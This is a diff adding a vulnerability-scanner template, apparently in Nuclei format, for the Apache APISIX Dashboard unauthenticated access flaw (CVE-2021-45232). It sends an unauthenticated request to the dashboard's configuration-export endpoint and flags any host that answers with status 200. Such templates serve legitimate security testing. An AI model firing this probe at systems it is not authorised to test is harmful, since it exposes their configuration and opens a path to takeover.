@@ -1,0 +1,21 @@
+id: poc-yaml-apache-apisix-dashboard-api-unauth-rce
+
+info:
+  name: poc-yaml-apache-apisix-dashboard-api-unauth-rce
+  author: Dale
+  severity: critical
+  tags: xray-converted,rce,unauth,ct-223787
+  reference:
+    - https://github.com/0rx1/cve-2021-45232-rce
+
+http:
+  - raw:
+      - |
+        GET /apisix/admin/migrate/export HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
